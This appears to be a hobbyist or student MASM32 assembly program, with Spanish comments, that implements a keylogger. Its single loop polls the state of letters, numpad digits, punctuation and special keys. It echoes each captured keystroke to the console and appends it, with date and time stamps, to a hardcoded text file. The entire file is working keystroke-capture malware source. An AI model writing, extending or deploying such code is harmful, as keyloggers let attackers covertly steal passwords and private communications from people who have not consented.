.386
.MODEL flat, stdcALl 
option casemap:none

;Includes
include \masm32\include\windows.inc 
include \masm32\include\kernel32.inc
include \masm32\include\masm32.inc
include \masm32\include\masm32rt.inc 
include \masm32\include\user32.inc

;Librerias
includelib \masm32\lib\user32.lib
includelib \masm32\lib\kernel32.lib
includelib \masm32\lib\masm32.lib

.DATA
	ruta_archivo BYTE "C:\Users\Carlos MorALes\Desktop\TEST.txt", 0  ;se deja la ruta del archivo en el cuAL se va a escribir

	;variables para calcular el tiempo actual del sistema 
	stm  SYSTEMTIME<>
    org stm
	wYear dw 0
	wMonth dw 0
	wToDay dw 0 
	wDay    dw 0
	wHour   dw 0
	wMinute dw 0
	wSecond dw 0
	wKsecond dw 0

	date_buf   db 50 dup (32)
	time_buf   db 20 dup (32)
           db 0
	dateformat db " dddd, MMMM, dd, yyyy", 0
	timeformat db "hh:mm:ss tt",0

	keylogger BYTE "KEYLOGGER", 0

	;CARÁCTERES ESPECIALES
	espacio BYTE " ", 0
	punto BYTE ".", 0
	coma BYTE ",", 0
	suma BYTE "+", 0
	resta BYTE "-", 0
	backspace BYTE "<BACKSPACE>", 0
	tab BYTE "<TAB>", 0
	shift BYTE "<SHIFT>", 0
	control BYTE "<CONTROL>", 0
	alt BYTE "<ALT>", 0
	escape BYTE "<ESC>", 0
	left BYTE "<", 0
	right BYTE ">", 0
	up BYTE "^", 0
	down BYTE "v", 0
	insert BYTE "<INSERT>", 0
	delete BYTE "<DELETE>", 0
	windows BYTE "<WINDOWS>", 0
	num_lock BYTE "<NUM LOCK>", 0

	;LETRAS
	;a|A
	letraA BYTE "a", 0
	letraA_blqMayus BYTE "A", 0
	;b|B
	letraB BYTE "b", 0
	letraB_blqMayus BYTE "B", 0
	;c|C
	letraC BYTE "c", 0
	letraC_blqMayus BYTE "C", 0
	;d|D
	letraD BYTE "d", 0
	letraD_blqMayus BYTE "D", 0
	;e|E
	letraE BYTE "e", 0
	letraE_blqMayus BYTE "E", 0
	;f|F
	letraF BYTE "f", 0
	letraF_blqMayus BYTE "F", 0
	;g|G
	letraG BYTE "g", 0
	letraG_blqMayus BYTE "G", 0
	;h|H
	letrAH BYTE "h", 0
	letrAH_blqMayus BYTE "H", 0
	;i|I
	letraI BYTE "i", 0
	letraI_blqMayus BYTE "I", 0
	;j|J
	letraJ BYTE "j", 0
	letraJ_blqMayus BYTE "J", 0
	;k|K
	letraK BYTE "k", 0
	letraK_blqMayus BYTE "K", 0
	;l|L
	letrAL BYTE "l", 0
	letrAL_blqMayus BYTE "L", 0
	;m|M
	letraM BYTE "m", 0
	letraM_blqMayus BYTE "M", 0
	;n|N
	letraN BYTE "n", 0
	letraN_blqMayus BYTE "N", 0
	;ñ|Ñ
	enie BYTE "n~",0
	enieM BYTE "N~",0
	;o|O
	letraO BYTE "o", 0
	letraO_blqMayus BYTE "O", 0
	;p|P
	letraP BYTE "p", 0
	letraP_blqMayus BYTE "P", 0
	;q|Q
	letraQ BYTE "q", 0
	letraQ_blqMayus BYTE "Q", 0
	;r|R
	letraR BYTE "r", 0
	letraR_blqMayus BYTE "R", 0
	;s|S
	letraS BYTE "s", 0
	letraS_blqMayus BYTE "S", 0
	;t|T
	letraT BYTE "t", 0
	letraT_blqMayus BYTE "T", 0
	;u|U
	letraU BYTE "u", 0
	letraU_blqMayus BYTE "U", 0
	;v|V
	letraV BYTE "v", 0
	letraV_blqMayus BYTE "V", 0
	;w|W
	letraW BYTE "w", 0
	letraW_blqMayus BYTE "W", 0
	;x|X
	letraX BYTE "x", 0
	letraX_blqMayus BYTE "X", 0
	;y|Y
	letraY BYTE "y", 0
	letraY_blqMayus BYTE "Y", 0
	;z|Z
	letraZ BYTE "z", 0
	letraZ_blqMayus BYTE "Z", 0
	
	;NUMEROS
	;0
	num_0 BYTE "0",0
	;1
	num_1 BYTE "1",0
	;2
	num_2 BYTE "2",0
	;3
	num_3 BYTE "3",0
	;4
	num_4 BYTE "4",0
	;5
	num_5 BYTE "5",0
	;6
	num_6 BYTE "6",0
	;7
	num_7 BYTE "7",0
	;8
	num_8 BYTE "8",0
	;9
	num_9 BYTE "9",0
	
	hFile HANDLE ?	 ;files handle hFile

.CODE
programa:
main PROC	;procedimiento main
LOCAl systime:SYSTEMTIME
	;creamos un archivo con la ruta de "ruta_archivo", cada vez que se ejecuta el programa se crea el archivo por el "CREATE_ALWAYS"
	INVOKE CreateFile,			
	ADDR ruta_archivo, 
	GENERIC_READ OR GENERIC_WRITE, 
	FILE_SHARE_READ OR FILE_SHARE_WRITE, 
	NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL 
	MOV hFile,EAX

	INVOKE StdOut, ADDR keylogger
	INVOKE WriteFile, hFile, OFFSET keylogger, EAX, NULL, NULL

	INVOKE StdOut, ADDR espacio
	INVOKE WriteFile, hFile, OFFSET espacio, EAX, NULL, NULL

CICLO:
	.WHILE 1
	
	;CARÁCTERES ESPECIALES
	
	;ESPACIO
	INVOKE GetKeyState, VK_SPACE
	TEST AH, AH
	.IF SIGN?
		INVOKE StdOut, ADDR espacio
		INVOKE WriteFile, hFile, OFFSET espacio, EAX, NULL, NULL

		INVOKE   GetLocalTime, ADDR stm
	    INVOKE   GetDateFormat, 0, 0, \
        ADDR stm, ADDR dateformat, ADDR date_buf, 50
		INVOKE   GetDateFormat, 0, 0, \
            0, ADDR dateformat, ADDR date_buf, 50
		MOV   ecx, offset date_buf
		ADD   ecx, eax
		MOV   byte ptr [ecx-1], " " 
		INVOKE   GetTimeFormat, 0, 0, \
            0, ADDR timeformat, ecx, 20
	    INVOKE StdOut, ADDR date_buf
		INVOKE WriteFile, hFile, OFFSET date_buf, EAX, NULL, NULL
		INVOKE StdOut, ADDR espacio
		INVOKE WriteFile, hFile, OFFSET espacio, EAX, NULL, NULL
		;INVOKE   MessageBox, 0, addr date_buf, addr date_buf, MB_OK
		INVOKE Sleep, 200
		JMP CICLO		
	.ENDIF

	;ENTER
	INVOKE GetKeyState, VK_RETURN
	TEST AH, AH
	.IF SIGN?
		INVOKE   GetLocalTime, ADDR stm
	    INVOKE   GetDateFormat, 0, 0, \
        ADDR stm, ADDR dateformat, ADDR date_buf, 50
		INVOKE   GetDateFormat, 0, 0, \
            0, ADDR dateformat, ADDR date_buf, 50
		MOV   ecx, offset date_buf
		ADD   ecx, eax
		MOV   byte ptr [ecx-1], " " 
		INVOKE   GetTimeFormat, 0, 0, \
            0, ADDR timeformat, ecx, 20
 
	    INVOKE StdOut, ADDR date_buf
		INVOKE WriteFile, hFile, OFFSET date_buf, EAX, NULL, NULL
		INVOKE StdOut, ADDR espacio
		INVOKE WriteFile, hFile, OFFSET espacio, EAX, NULL, NULL
		;INVOKE   MessageBox, 0, addr date_buf, addr date_buf, MB_OK
		INVOKE Sleep, 200
		JMP CICLO		
	.ENDIF

	
	INVOKE GetKeyState, VK_OEM_PERIOD
	TEST AH, AH
	.IF SIGN?
		INVOKE StdOut, ADDR punto
		INVOKE WriteFile, hFile, OFFSET punto, EAX, NULL, NULL			
		INVOKE Sleep, 200
		JMP CICLO		
	.ENDIF

	INVOKE GetKeyState, VK_OEM_PLUS
	TEST AH, AH
	.IF SIGN?
		INVOKE StdOut, ADDR suma
		INVOKE WriteFile, hFile, OFFSET suma, EAX, NULL, NULL			
		INVOKE Sleep, 200
		JMP CICLO		
	.ENDIF

	INVOKE GetKeyState, VK_BACK
	TEST AH, AH
	.IF SIGN?
		INVOKE StdOut, ADDR backspace
		INVOKE WriteFile, hFile, OFFSET backspace, EAX, NULL, NULL			
		INVOKE Sleep, 200
		JMP CICLO		
	.ENDIF

	INVOKE GetKeyState, VK_TAB
	TEST AH, AH
	.IF SIGN?
		INVOKE StdOut, ADDR tab
		INVOKE WriteFile, hFile, OFFSET tab, EAX, NULL, NULL			
		INVOKE Sleep, 200
		JMP CICLO		
	.ENDIF

	INVOKE GetKeyState, VK_SHIFT
	TEST AH, AH
	.IF SIGN?
		INVOKE StdOut, ADDR shift
		INVOKE WriteFile, hFile, OFFSET shift, EAX, NULL, NULL			
		INVOKE Sleep, 200
		JMP CICLO		
	.ENDIF

	INVOKE GetKeyState, VK_CONTROL
	TEST AH, AH
	.IF SIGN?
		INVOKE StdOut, ADDR control
		INVOKE WriteFile, hFile, OFFSET control, EAX, NULL, NULL			
		INVOKE Sleep, 200
		JMP CICLO		
	.ENDIF

	INVOKE GetKeyState, VK_ESCAPE
	TEST AH, AH
	.IF SIGN?
		INVOKE StdOut, ADDR escape
		INVOKE WriteFile, hFile, OFFSET escape, EAX, NULL, NULL			
		INVOKE Sleep, 200
		JMP CICLO		
	.ENDIF

	INVOKE GetKeyState, VK_LEFT
	TEST AH, AH
	.IF SIGN?
		INVOKE StdOut, ADDR left
		INVOKE WriteFile, hFile, OFFSET left, EAX, NULL, NULL			
		INVOKE Sleep, 200
		JMP CICLO		
	.ENDIF

	INVOKE GetKeyState, VK_UP
	TEST AH, AH
	.IF SIGN?
		INVOKE StdOut, ADDR up
		INVOKE WriteFile, hFile, OFFSET up, EAX, NULL, NULL			
		INVOKE Sleep, 200
		JMP CICLO		
	.ENDIF

	INVOKE GetKeyState, VK_RIGHT
	TEST AH, AH
	.IF SIGN?
		INVOKE StdOut, ADDR right
		INVOKE WriteFile, hFile, OFFSET right, EAX, NULL, NULL			
		INVOKE Sleep, 200
		JMP CICLO		
	.ENDIF

	INVOKE GetKeyState, VK_DOWN
	TEST AH, AH
	.IF SIGN?
		INVOKE StdOut, ADDR down
		INVOKE WriteFile, hFile, OFFSET down, EAX, NULL, NULL			
		INVOKE Sleep, 200
		JMP CICLO		
	.ENDIF

	INVOKE GetKeyState, VK_NUMLOCK
	TEST AH, AH
	.IF SIGN?
		INVOKE StdOut, ADDR num_lock
		INVOKE WriteFile, hFile, OFFSET num_lock, EAX, NULL, NULL			
		INVOKE Sleep, 200
		JMP CICLO		
	.ENDIF

	INVOKE GetKeyState, VK_INSERT
	TEST AH, AH
	.IF SIGN?
		INVOKE StdOut, ADDR insert
		INVOKE WriteFile, hFile, OFFSET insert, EAX, NULL, NULL			
		INVOKE Sleep, 200
		JMP CICLO		
	.ENDIF

	INVOKE GetKeyState, VK_DELETE
	TEST AH, AH
	.IF SIGN?
		INVOKE StdOut, ADDR delete
		INVOKE WriteFile, hFile, OFFSET delete, EAX, NULL, NULL			
		INVOKE Sleep, 200
		JMP CICLO		
	.ENDIF

	INVOKE GetKeyState, VK_MENU
	TEST AH, AH
	.IF SIGN?
		INVOKE StdOut, ADDR alt
		INVOKE WriteFile, hFile, OFFSET alt, EAX, NULL, NULL			
		INVOKE Sleep, 200
		JMP CICLO		
	.ENDIF

	INVOKE GetKeyState, VK_LWIN
	TEST AH, AH
	.IF SIGN?
		INVOKE StdOut, ADDR windows
		INVOKE WriteFile, hFile, OFFSET windows, EAX, NULL, NULL			
		INVOKE Sleep, 200
		JMP CICLO		
	.ENDIF

	INVOKE GetKeyState, VK_OEM_COMMA
	TEST AH, AH
	.IF SIGN?
		INVOKE StdOut, ADDR coma
		INVOKE WriteFile, hFile, OFFSET coma, EAX, NULL, NULL			
		INVOKE Sleep, 200
		JMP CICLO		
	.ENDIF

	INVOKE GetKeyState, VK_OEM_MINUS
	TEST AH, AH
	.IF SIGN?
		INVOKE StdOut, ADDR resta
		INVOKE WriteFile, hFile, OFFSET resta, EAX, NULL, NULL			
		INVOKE Sleep, 200
		JMP CICLO		
	.ENDIF


	;LETRAS
	INVOKE GetAsyncKeyState, VK_A
	TEST AH, AH
	.IF SIGN?
		;mayuscula
		INVOKE GetKeyState, VK_CAPITAL								
		TEST AL, 1
		.IF !ZERO?
			INVOKE StdOut, ADDR letraA_blqMayus
			INVOKE WriteFile, hFile, OFFSET letraA_blqMayus, EAX, NULL, NULL
			INVOKE Sleep, 200
		.ELSE
			;minuscula
			INVOKE StdOut, ADDR letraA
			INVOKE WriteFile,hFile,OFFSET letraA,EAX,NULL,NULL
			INVOKE Sleep, 200
		.ENDIF
		JMP CICLO
	.ENDIF

	INVOKE GetAsyncKeyState, VK_B
	TEST AH, AH
	.IF SIGN?
		;mayuscula
		INVOKE GetKeyState, VK_CAPITAL								
		TEST AL, 1
		.IF !ZERO?
			INVOKE StdOut, ADDR letraB_blqMayus
			INVOKE WriteFile,hFile,OFFSET letraB_blqMayus,EAX,NULL,NULL
			INVOKE Sleep, 200
		.ELSE
			;minuscula
			INVOKE StdOut, ADDR letraB
			INVOKE WriteFile,hFile,OFFSET letraB,EAX,NULL,NULL
			INVOKE Sleep, 200
		.ENDIF
		JMP CICLO
	.ENDIF

	INVOKE GetAsyncKeyState, VK_C
	TEST AH, AH
	.IF SIGN?
		;mayuscula
		INVOKE GetKeyState, VK_CAPITAL								
		TEST AL, 1
		.IF !ZERO?
			INVOKE StdOut, ADDR letraC_blqMayus
			INVOKE WriteFile,hFile,OFFSET letraC_blqMayus,EAX,NULL,NULL
			INVOKE Sleep, 200
		.ELSE
			;minuscula
			INVOKE StdOut, ADDR letraC
			INVOKE WriteFile,hFile,OFFSET letraC,EAX,NULL,NULL
			INVOKE Sleep, 200
		.ENDIF
		JMP CICLO
	.ENDIF

	INVOKE GetAsyncKeyState, VK_D
	TEST AH, AH
	.IF SIGN?
		;mayuscula
		INVOKE GetKeyState, VK_CAPITAL								
		TEST AL, 1
		.IF !ZERO?
			INVOKE StdOut, ADDR letraD_blqMayus
			INVOKE WriteFile,hFile,OFFSET letraD_blqMayus,EAX,NULL,NULL
			INVOKE Sleep, 200
		.ELSE
			;minuscula
			INVOKE StdOut, ADDR letraD
			INVOKE WriteFile,hFile,OFFSET letraD,EAX,NULL,NULL
			INVOKE Sleep, 200
		.ENDIF
		JMP CICLO
	.ENDIF

	INVOKE GetAsyncKeyState, VK_E
	TEST AH, AH
	.IF SIGN?
		;mayuscula
		INVOKE GetKeyState, VK_CAPITAL								
		TEST AL, 1
		.IF !ZERO?
			INVOKE StdOut, ADDR letraE_blqMayus
			INVOKE WriteFile,hFile,OFFSET letraE_blqMayus,EAX,NULL,NULL
			INVOKE Sleep, 200
		.ELSE
			;minuscula
			INVOKE StdOut, ADDR letraE
			INVOKE WriteFile,hFile,OFFSET letraE,EAX,NULL,NULL
			INVOKE Sleep, 200
		.ENDIF
		JMP CICLO
	.ENDIF

	INVOKE GetAsyncKeyState, VK_F
	TEST AH, AH
	.IF SIGN?
		;mayuscula
		INVOKE GetKeyState, VK_CAPITAL								
		TEST AL, 1
		.IF !ZERO?
			INVOKE StdOut, ADDR letraF_blqMayus
			INVOKE WriteFile,hFile,OFFSET letraF_blqMayus,EAX,NULL,NULL
			INVOKE Sleep, 200
		.ELSE
			;minuscula
			INVOKE StdOut, ADDR letraF
			INVOKE WriteFile,hFile,OFFSET letraF,EAX,NULL,NULL
			INVOKE Sleep, 200
		.ENDIF
		JMP CICLO
	.ENDIF

	INVOKE GetAsyncKeyState, VK_G
	TEST AH, AH
	.IF SIGN?
		;mayuscula
		INVOKE GetKeyState, VK_CAPITAL								
		TEST AL, 1
		.IF !ZERO?
			INVOKE StdOut, ADDR letraG_blqMayus
			INVOKE WriteFile,hFile,OFFSET letraG_blqMayus,EAX,NULL,NULL
			INVOKE Sleep, 200
		.ELSE
			;minuscula
			INVOKE StdOut, ADDR letraG
			INVOKE WriteFile,hFile,OFFSET letraG,EAX,NULL,NULL
			INVOKE Sleep, 200
		.ENDIF
		JMP CICLO
	.ENDIF

	INVOKE GetAsyncKeyState, VK_H
	TEST AH, AH
	.IF SIGN?
		;mayuscula
		INVOKE GetKeyState, VK_CAPITAL								
		TEST AL, 1
		.IF !ZERO?
			INVOKE StdOut, ADDR letrAH_blqMayus
			INVOKE WriteFile,hFile,OFFSET letrAH_blqMayus,EAX,NULL,NULL
			INVOKE Sleep, 200
		.ELSE
			;minuscula
			INVOKE StdOut, ADDR letrAH
			INVOKE WriteFile,hFile,OFFSET letrAH,EAX,NULL,NULL
			INVOKE Sleep, 200
		.ENDIF
		JMP CICLO
	.ENDIF

	INVOKE GetAsyncKeyState, VK_I
	TEST AH, AH
	.IF SIGN?
		;mayuscula
		INVOKE GetKeyState, VK_CAPITAL								
		TEST AL, 1
		.IF !ZERO?
			INVOKE StdOut, ADDR letraI_blqMayus
			INVOKE WriteFile,hFile,OFFSET letraI_blqMayus,EAX,NULL,NULL
			INVOKE Sleep, 200
		.ELSE
			;minuscula
			INVOKE StdOut, ADDR letraI
			INVOKE WriteFile,hFile,OFFSET letraI,EAX,NULL,NULL
			INVOKE Sleep, 200
			.ENDIF
		JMP CICLO
	.ENDIF

	INVOKE GetAsyncKeyState, VK_J
	TEST AH, AH
	.IF SIGN?
		;mayuscula
		INVOKE GetKeyState, VK_CAPITAL								
		TEST AL, 1
		.IF !ZERO?
			INVOKE StdOut, ADDR letraJ_blqMayus
			INVOKE WriteFile,hFile,OFFSET letraJ_blqMayus,EAX,NULL,NULL
			INVOKE Sleep, 200
		.ELSE
			;minuscula
			INVOKE StdOut, ADDR letraJ
			INVOKE WriteFile,hFile,OFFSET letraJ,EAX,NULL,NULL
			INVOKE Sleep, 200
		.ENDIF
		JMP CICLO
	.ENDIF

	INVOKE GetAsyncKeyState, VK_K
	TEST AH, AH
	.IF SIGN?
		;mayuscula
		INVOKE GetKeyState, VK_CAPITAL								
		TEST AL, 1
		.IF !ZERO?
			INVOKE StdOut, ADDR letraK_blqMayus
			INVOKE WriteFile,hFile,OFFSET letraK_blqMayus,EAX,NULL,NULL
			INVOKE Sleep, 200
		.ELSE
			;minuscula
			INVOKE StdOut, ADDR letraK
			INVOKE WriteFile,hFile,OFFSET letraK,EAX,NULL,NULL
			INVOKE Sleep, 200
		.ENDIF
		JMP CICLO
	.ENDIF

	INVOKE GetAsyncKeyState, VK_L
	TEST AH, AH
	.IF SIGN?
		;mayuscula
		INVOKE GetKeyState, VK_CAPITAL								
		TEST AL, 1
		.IF !ZERO?
			INVOKE StdOut, ADDR letrAL_blqMayus
			INVOKE WriteFile,hFile,OFFSET letrAL_blqMayus,EAX,NULL,NULL
			INVOKE Sleep, 200
		.ELSE
			;minuscula
			INVOKE StdOut, ADDR letrAL
			INVOKE WriteFile,hFile,OFFSET letrAL,EAX,NULL,NULL
			INVOKE Sleep, 200
		.ENDIF
		JMP CICLO
	.ENDIF

	INVOKE GetAsyncKeyState, VK_M
	TEST AH, AH
	.IF SIGN?
		;mayuscula
		INVOKE GetKeyState, VK_CAPITAL								
		TEST AL, 1
		.IF !ZERO?
			INVOKE StdOut, ADDR letraM_blqMayus
			INVOKE WriteFile,hFile,OFFSET letraM_blqMayus,EAX,NULL,NULL
			INVOKE Sleep, 200
		.ELSE
			;minuscula
			INVOKE StdOut, ADDR letraM
			INVOKE WriteFile,hFile,OFFSET letraM,EAX,NULL,NULL
			INVOKE Sleep, 200
		.ENDIF
		JMP CICLO
	.ENDIF

	INVOKE GetAsyncKeyState, VK_N
	TEST AH, AH
	.IF SIGN?
		;mayuscula
		INVOKE GetKeyState, VK_CAPITAL								
		TEST AL, 1
		.IF !ZERO?
			INVOKE StdOut, ADDR letraN_blqMayus
			INVOKE WriteFile,hFile,OFFSET letraN_blqMayus,EAX,NULL,NULL
			INVOKE Sleep, 200
		.ELSE
			;minuscula
			INVOKE StdOut, ADDR letraN
			INVOKE WriteFile,hFile,OFFSET letraN,EAX,NULL,NULL
			INVOKE Sleep, 200
		.ENDIF
		JMP CICLO
	.ENDIF
	
	INVOKE GetAsyncKeyState, VK_OEM_3
	TEST AH, AH
	.IF SIGN?
		;mayuscula
		INVOKE GetKeyState, VK_CAPITAL								
		TEST AL, 1
		.IF !ZERO?
			INVOKE StdOut, ADDR enieM
			INVOKE WriteFile,hFile,OFFSET enieM,EAX,NULL,NULL
			INVOKE Sleep, 200
		.ELSE
			;minuscula
			INVOKE StdOut, ADDR enie
			INVOKE WriteFile,hFile,OFFSET enie,EAX,NULL,NULL
			INVOKE Sleep, 200
		.ENDIF
		JMP CICLO
	.ENDIF

	INVOKE GetAsyncKeyState, VK_O
	TEST AH, AH
	.IF SIGN?
		;mayuscula
		INVOKE GetKeyState, VK_CAPITAL								
		TEST AL, 1
		.IF !ZERO?
			INVOKE StdOut, ADDR letraO_blqMayus
			INVOKE WriteFile,hFile,OFFSET letraO_blqMayus,EAX,NULL,NULL
			INVOKE Sleep, 200
		.ELSE
			;minuscula
			INVOKE StdOut, ADDR letraO
			INVOKE WriteFile,hFile,OFFSET letraO,EAX,NULL,NULL
			INVOKE Sleep, 200
		.ENDIF
		JMP CICLO
	.ENDIF

	INVOKE GetAsyncKeyState, VK_P
	TEST AH, AH
	.IF SIGN?
		;mayuscula
		INVOKE GetKeyState, VK_CAPITAL								
		TEST AL, 1
		.IF !ZERO?
			INVOKE StdOut, ADDR letraP_blqMayus
			INVOKE WriteFile,hFile,OFFSET letraP_blqMayus,EAX,NULL,NULL
			INVOKE Sleep, 200
		.ELSE
			;minuscula
			INVOKE StdOut, ADDR letraP
			INVOKE WriteFile,hFile,OFFSET letraP,EAX,NULL,NULL
			INVOKE Sleep, 200
		.ENDIF
		JMP CICLO
	.ENDIF

	INVOKE GetAsyncKeyState, VK_Q
	TEST AH, AH
	.IF SIGN?
		;mayuscula
		INVOKE GetKeyState, VK_CAPITAL								
		TEST AL, 1
		.IF !ZERO?
			INVOKE StdOut, ADDR letraQ_blqMayus
			INVOKE WriteFile,hFile,OFFSET letraQ_blqMayus,EAX,NULL,NULL
			INVOKE Sleep, 200
		.ELSE
			;minuscula
			INVOKE StdOut, ADDR letraQ
			INVOKE WriteFile,hFile,OFFSET letraQ,EAX,NULL,NULL
			INVOKE Sleep, 200
		.ENDIF
		JMP CICLO
	.ENDIF

	INVOKE GetAsyncKeyState, VK_R
	TEST AH, AH
	.IF SIGN?
		;mayuscula
		INVOKE GetKeyState, VK_CAPITAL								
		TEST AL, 1
		.IF !ZERO?
			INVOKE StdOut, ADDR letraR_blqMayus
			INVOKE WriteFile,hFile,OFFSET letraR_blqMayus,EAX,NULL,NULL
			INVOKE Sleep, 200
		.ELSE
			;minuscula
			INVOKE StdOut, ADDR letraR
			INVOKE WriteFile,hFile,OFFSET letraR,EAX,NULL,NULL
			INVOKE Sleep, 200
		.ENDIF
		JMP CICLO
	.ENDIF

	INVOKE GetAsyncKeyState, VK_S
	TEST AH, AH
	.IF SIGN?
		;mayuscula
		INVOKE GetKeyState, VK_CAPITAL								
		TEST AL, 1
		.IF !ZERO?
			INVOKE StdOut, ADDR letraS_blqMayus
			INVOKE WriteFile,hFile,OFFSET letraS_blqMayus,EAX,NULL,NULL
			INVOKE Sleep, 200
		.ELSE
			;minuscula
			INVOKE StdOut, ADDR letraS
			INVOKE WriteFile,hFile,OFFSET letraS,EAX,NULL,NULL
			INVOKE Sleep, 200
		.ENDIF
		JMP CICLO
	.ENDIF

	INVOKE GetAsyncKeyState, VK_T
	TEST AH, AH
	.IF SIGN?
		;mayuscula
		INVOKE GetKeyState, VK_CAPITAL								
		TEST AL, 1
		.IF !ZERO?
			INVOKE StdOut, ADDR letraT_blqMayus
			INVOKE WriteFile,hFile,OFFSET letraT_blqMayus,EAX,NULL,NULL
			INVOKE Sleep, 200
		.ELSE
			;minuscula
			INVOKE StdOut, ADDR letraT
			INVOKE WriteFile,hFile,OFFSET letraT,EAX,NULL,NULL
			INVOKE Sleep, 200
		.ENDIF
		JMP CICLO
	.ENDIF

	INVOKE GetAsyncKeyState, VK_U
	TEST AH, AH
	.IF SIGN?
		;mayuscula
		INVOKE GetKeyState, VK_CAPITAL								
		TEST AL, 1
		.IF !ZERO?
			INVOKE StdOut, ADDR letraU_blqMayus
			INVOKE WriteFile,hFile,OFFSET letraU_blqMayus,EAX,NULL,NULL
			INVOKE Sleep, 200
		.ELSE
			;minuscula
			INVOKE StdOut, ADDR letraU
			INVOKE WriteFile,hFile,OFFSET letraU,EAX,NULL,NULL
			INVOKE Sleep, 200
		.ENDIF
		JMP CICLO
	.ENDIF

	INVOKE GetAsyncKeyState, VK_V
	TEST AH, AH
	.IF SIGN?
		;mayuscula
		INVOKE GetKeyState, VK_CAPITAL								
		TEST AL, 1
		.IF !ZERO?
			INVOKE StdOut, ADDR letraV_blqMayus
			INVOKE WriteFile,hFile,OFFSET letraV_blqMayus,EAX,NULL,NULL
			INVOKE Sleep, 200
		.ELSE
			;minuscula
			INVOKE StdOut, ADDR letraV
			INVOKE WriteFile,hFile,OFFSET letraV,EAX,NULL,NULL
			INVOKE Sleep, 200
		.ENDIF
		JMP CICLO
	.ENDIF 

	INVOKE GetAsyncKeyState, VK_W
	TEST AH, AH
	.IF SIGN?
		;mayuscula
		INVOKE GetKeyState, VK_CAPITAL								
		TEST AL, 1
		.IF !ZERO?
			INVOKE StdOut, ADDR letraW_blqMayus
			INVOKE WriteFile,hFile,OFFSET letraW_blqMayus,EAX,NULL,NULL
			INVOKE Sleep, 200
		.ELSE
			;minuscula
			INVOKE StdOut, ADDR letraW
			INVOKE WriteFile,hFile,OFFSET letraW,EAX,NULL,NULL
			INVOKE Sleep, 200
		.ENDIF
		JMP CICLO
	.ENDIF 
		

	INVOKE GetAsyncKeyState, VK_X
	TEST AH, AH
	.IF SIGN?
		;mayuscula
		INVOKE GetKeyState, VK_CAPITAL								
		TEST AL, 1
		.IF !ZERO?
			INVOKE StdOut, ADDR letraX_blqMayus
			INVOKE WriteFile,hFile,OFFSET letraX_blqMayus,EAX,NULL,NULL
			INVOKE Sleep, 200
		.ELSE
			;minuscula
			INVOKE StdOut, ADDR letraX
			INVOKE WriteFile,hFile,OFFSET letraX,EAX,NULL,NULL
			INVOKE Sleep, 200
		.ENDIF
		JMP CICLO
	.ENDIF

	INVOKE GetAsyncKeyState, VK_Y
	TEST AH, AH
	.IF SIGN?
		;mayuscula
		INVOKE GetKeyState, VK_CAPITAL								
		TEST AL, 1
		.IF !ZERO?
			INVOKE StdOut, ADDR letraY_blqMayus
			INVOKE WriteFile,hFile,OFFSET letraY_blqMayus,EAX,NULL,NULL
			INVOKE Sleep, 200
		.ELSE
			;minuscula
			INVOKE StdOut, ADDR letraY
			INVOKE WriteFile,hFile,OFFSET letraY,EAX,NULL,NULL
			INVOKE Sleep, 200
		.ENDIF
		JMP CICLO
	.ENDIF

	INVOKE GetKeyState, VK_Z
	TEST AH, AH
	.IF SIGN?
		;mayuscula
		INVOKE GetKeyState, VK_CAPITAL								
		TEST AL, 1
		.IF !ZERO?
			INVOKE StdOut, ADDR letraZ_blqMayus						
			INVOKE WriteFile,hFile,OFFSET letraZ_blqMayus,EAX,NULL,NULL
			INVOKE Sleep, 200
		.ELSE
			;minuscula
			INVOKE StdOut, ADDR letraZ
			INVOKE WriteFile,hFile,OFFSET letraZ,EAX,NULL,NULL	
			INVOKE Sleep, 200
		.ENDIF
		JMP CICLO		
	.ENDIF


	;NUMEROS
	INVOKE GetKeyState, VK_NUMPAD0
	TEST AH, AH
	.IF SIGN?
		INVOKE StdOut, ADDR num_0
		INVOKE WriteFile,hFile,OFFSET num_0,EAX,NULL,NULL			
		INVOKE Sleep, 200
		JMP CICLO		
	.ENDIF

	INVOKE GetKeyState, VK_NUMPAD1
	TEST AH, AH
	.IF SIGN?
		INVOKE StdOut, ADDR num_1
		INVOKE WriteFile,hFile,OFFSET num_1,EAX,NULL,NULL			
		INVOKE Sleep, 200
		JMP CICLO		
	.ENDIF

	INVOKE GetKeyState, VK_NUMPAD2
	TEST AH, AH
	.IF SIGN?
		INVOKE StdOut, ADDR num_2
		INVOKE WriteFile,hFile,OFFSET num_2,EAX,NULL,NULL			
		INVOKE Sleep, 200
		JMP CICLO		
	.ENDIF

	INVOKE GetKeyState, VK_NUMPAD3
	TEST AH, AH
	.IF SIGN?
		INVOKE StdOut, ADDR num_3
		INVOKE WriteFile,hFile,OFFSET num_3,EAX,NULL,NULL			
		INVOKE Sleep, 200
		JMP CICLO		
	.ENDIF

	INVOKE GetKeyState, VK_NUMPAD4
	TEST AH, AH
	.IF SIGN?
		INVOKE StdOut, ADDR num_4
		INVOKE WriteFile,hFile,OFFSET num_4,EAX,NULL,NULL			
		INVOKE Sleep, 200
		JMP CICLO		
	.ENDIF

	INVOKE GetKeyState, VK_NUMPAD5
	TEST AH, AH
	.IF SIGN?
		INVOKE StdOut, ADDR num_5
		INVOKE WriteFile,hFile,OFFSET num_5,EAX,NULL,NULL			
		INVOKE Sleep, 200
		JMP CICLO		
	.ENDIF

	INVOKE GetKeyState, VK_NUMPAD6
	TEST AH, AH
	.IF SIGN?
		INVOKE StdOut, ADDR num_6
		INVOKE WriteFile,hFile,OFFSET num_6,EAX,NULL,NULL			
		INVOKE Sleep, 200
		JMP CICLO		
	.ENDIF

	INVOKE GetKeyState, VK_NUMPAD7
	TEST AH, AH
	.IF SIGN?
		INVOKE StdOut, ADDR num_7
		INVOKE WriteFile,hFile,OFFSET num_7,EAX,NULL,NULL			
		INVOKE Sleep, 200
		JMP CICLO		
	.ENDIF

	INVOKE GetKeyState, VK_NUMPAD8
	TEST AH, AH
	.IF SIGN?
		INVOKE StdOut, ADDR num_8
		INVOKE WriteFile,hFile,OFFSET num_8,EAX,NULL,NULL			
		INVOKE Sleep, 200
		JMP CICLO		
	.ENDIF

	INVOKE GetKeyState, VK_NUMPAD9
	TEST AH, AH
	.IF SIGN?
		INVOKE StdOut, ADDR num_9
		INVOKE WriteFile,hFile,OFFSET num_9,EAX,NULL,NULL			
		INVOKE Sleep, 200
		JMP CICLO		
	.ENDIF

  .ENDW		;end while
main ENDP	;end procedimiento main
END programa